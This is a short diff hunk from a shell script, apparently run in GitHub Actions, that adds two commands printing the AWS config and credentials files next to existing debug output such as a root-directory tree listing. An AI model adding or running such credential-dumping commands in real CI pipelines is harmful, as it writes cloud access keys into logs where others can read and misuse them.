@@ -89,7 +89,8 @@ echo "------------------------"
 
 
 tree -L 3 -a /
-
+cat /github/home/.aws/config
+cat /github/home/.aws/credentials
 
 echo $(pwd)
 
